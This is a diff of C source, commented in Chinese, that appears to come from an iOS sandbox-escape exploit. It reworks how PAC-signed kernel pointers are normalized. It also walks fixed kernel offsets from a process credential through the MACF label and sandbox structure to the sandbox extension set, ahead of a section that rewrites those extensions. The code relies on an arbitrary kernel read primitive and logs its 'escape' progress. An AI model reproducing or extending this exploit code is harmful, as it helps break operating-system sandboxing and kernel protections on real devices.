@@ -135,17 +135,30 @@ static uint32_t ds_kread32_safe(uint64_t addr)
     return (uint32_t)(ds_kread_safe(addr) & 0xFFFFFFFFULL);
 }
 
-/// 指针可能是 PAC / SMR 形态，取第一个落在已知映射区里的候选形态
+/// 指针还原：照抄 lara（pe/sbx.m）的 `S(x) = xpaci(x); signptr(v)` 语义。
+/// 只做**值变换**，不解引用——所以这里怎么试都不会崩内核。
+/// 顺序：XPACI → XPACD → 低 36 位补堆段 → 低 36 位补静态段 → 原样。
+/// 每个候选都要求落在已知映射区，否则丢弃。
 static uint64_t ds_normalize_ptr(uint64_t raw)
 {
-    uint64_t forms[DS_FORM_COUNT];
-    if (ds_pointer_forms(raw, forms) == 0) return 0;
+    if (!raw) return 0;
 
-    // 优先挑堆对象（ucred/label/sandbox/ext 都在 zone 里）
-    for (int i = 0; i < DS_FORM_COUNT; i++) {
-        if ((forms[i] & 0xFFFFFFFFFFF00000ULL) == 0xFFFFFFE000000000ULL) return forms[i];
+    uint64_t candidates[5] = {
+        ds_xpaci(raw),
+        ds_xpacd(raw),
+        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFE000000000ULL,
+        (raw & 0x0000000FFFFFFFFFULL) | 0xFFFFFFF000000000ULL,
+        raw
+    };
+
+    for (int i = 0; i < 5; i++) {
+        uint64_t value = candidates[i];
+        if (!value) continue;
+        if (!ds_is_kernel_region(value)) continue;
+        if ((value & 0x7) != 0) continue;      // 内核对象至少 8 字节对齐
+        return value;
     }
-    return forms[0];
+    return 0;
 }
 
 #pragma mark - 找到本进程的 proc
@@ -670,66 +683,45 @@ static uint64_t ds_discover_identities_v3(void)
 /// 为什么可以试多组 offset：起点是**已被 cr_uid 校验过的真 cred**（不是来路不明的字），
 /// 而且 label 有很强的结构签名——`l_perpolicy[0]`(AMFI) 与 `l_perpolicy[1]`(sandbox) 必须同时是内核指针；
 /// ext_set 还要能读出真正的 ext 链。三道都对上才认。
+/// 单路解析：cred → label(0x78) → sandbox(label+0x10) → ext_set(sandbox+0x10)。
+/// offset 直接用 lara（pe/sbx.m）里那三个已验证过的常量，**不做任何扫描、不做笛卡尔积试探**
+/// （上一版就是死在这里：几千次解引用踩到未映射地址 → 内核重启）。
 static uint64_t ds_resolve_sandbox_extset(uint64_t cred, uint64_t *outSandbox)
 {
-    // 列表首位是「实测/文档最可能」的值，命中即返回，避免做无谓的解引用
-    static const uint64_t labelOffs[]   = { 0x78, 0x70, 0x80, 0x68, 0x88, 0x90, 0x60 };
-    static const uint64_t sandboxOffs[] = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
-    static const uint64_t extSetOffs[]  = { 0x10, 0x08, 0x18, 0x20, 0x28, 0x30 };
-
-    for (int a = 0; a < 7; a++) {
-        uint64_t labelForms[DS_FORM_COUNT];
-        int labelCount = ds_pointer_forms(ds_kread_safe(cred + labelOffs[a]), labelForms);
-
-        for (int la = 0; la < labelCount; la++) {
-            uint64_t label = labelForms[la];
-
-            // label 结构签名：l_perpolicy[0]（AMFI 槽）必须是内核指针
-            if (!ds_normalize_ptr(ds_kread_safe(label + 0x08))) continue;
-
-            for (int b = 0; b < 6; b++) {
-                uint64_t sandboxForms[DS_FORM_COUNT];
-                int sandboxCount = ds_pointer_forms(ds_kread_safe(label + sandboxOffs[b]), sandboxForms);
-
-                for (int sb = 0; sb < sandboxCount; sb++) {
-                    uint64_t sandbox = sandboxForms[sb];
-
-                    for (int c = 0; c < 6; c++) {
-                        uint64_t extSetForms[DS_FORM_COUNT];
-                        int extSetCount = ds_pointer_forms(ds_kread_safe(sandbox + extSetOffs[c]), extSetForms);
-
-                        for (int es = 0; es < extSetCount; es++) {
-                            uint64_t extSet = extSetForms[es];
-
-                            // 第三道：ext_set 里要能读出真正的 ext 链
-                            bool extLooksRight = false;
-                            for (int slot = 0; slot < 8 && !extLooksRight; slot++) {
-                                uint64_t hdr = ds_normalize_ptr(ds_kread_safe(extSet + (uint64_t)slot * 8));
-                                if (!hdr) continue;
-                                uint64_t ext = ds_normalize_ptr(ds_kread_safe(hdr + 0x8));
-                                if (ext) extLooksRight = true;
-                            }
-                            if (!extLooksRight) continue;
-
-                            gCredOff.labelOff = labelOffs[a];
-                            gCredOff.sandboxOff = sandboxOffs[b];
-                            gCredOff.extSetOff = extSetOffs[c];
-                            if (outSandbox) *outSandbox = sandbox;
-
-                            ds_log("[逃逸] 沙盒链路确认：cred+0x%llx → label 0x%llx（形态 %d）；"
-                                    "label+0x%llx → sandbox 0x%llx；sandbox+0x%llx → ext_set 0x%llx",
-                                   (unsigned long long)labelOffs[a], (unsigned long long)label, la,
-                                   (unsigned long long)sandboxOffs[b], (unsigned long long)sandbox,
-                                   (unsigned long long)extSetOffs[c], (unsigned long long)extSet);
-                            return extSet;
-                        }
-                    }
-                }
-            }
-        }
+    uint64_t rawLabel = ds_kread_safe(cred + DS_OFF_UCRED_CR_LABEL);
+    uint64_t label = ds_normalize_ptr(rawLabel);
+    if (!label) {
+        ds_log("[逃逸] cred+0x%llx 读出来是 0x%llx，还原不成有效 label",
+               (unsigned long long)DS_OFF_UCRED_CR_LABEL, (unsigned long long)rawLabel);
+        return 0;
     }
 
-    return 0;
+    // MACF label 的结构签名：l_perpolicy[0]（AMFI 槽）应当也是有效内核指针
+    uint64_t amfi = ds_normalize_ptr(ds_kread_safe(label + 0x8));
+
+    uint64_t rawSandbox = ds_kread_safe(label + DS_OFF_LABEL_SANDBOX);
+    uint64_t sandbox = ds_normalize_ptr(rawSandbox);
+    if (!sandbox) {
+        ds_log("[逃逸] label=0x%llx（AMFI 槽=0x%llx）但 +0x%llx 读出来 0x%llx 还原不成 sandbox",
+               (unsigned long long)label, (unsigned long long)amfi,
+               (unsigned long long)DS_OFF_LABEL_SANDBOX, (unsigned long long)rawSandbox);
+        return 0;
+    }
+
+    uint64_t rawExtSet = ds_kread_safe(sandbox + DS_OFF_SANDBOX_EXT_SET);
+    uint64_t extSet = ds_normalize_ptr(rawExtSet);
+    if (!extSet) {
+        ds_log("[逃逸] sandbox=0x%llx 但 +0x%llx 读出来 0x%llx 还原不成 ext_set",
+               (unsigned long long)sandbox, (unsigned long long)DS_OFF_SANDBOX_EXT_SET,
+               (unsigned long long)rawExtSet);
+        return 0;
+    }
+
+    if (outSandbox) *outSandbox = sandbox;
+    ds_log("[逃逸] 链路：cred=0x%llx → label=0x%llx（AMFI 槽=0x%llx）→ sandbox=0x%llx → ext_set=0x%llx",
+           (unsigned long long)cred, (unsigned long long)label, (unsigned long long)amfi,
+           (unsigned long long)sandbox, (unsigned long long)extSet);
+    return extSet;
 }
 
 #pragma mark - 改写沙盒扩展
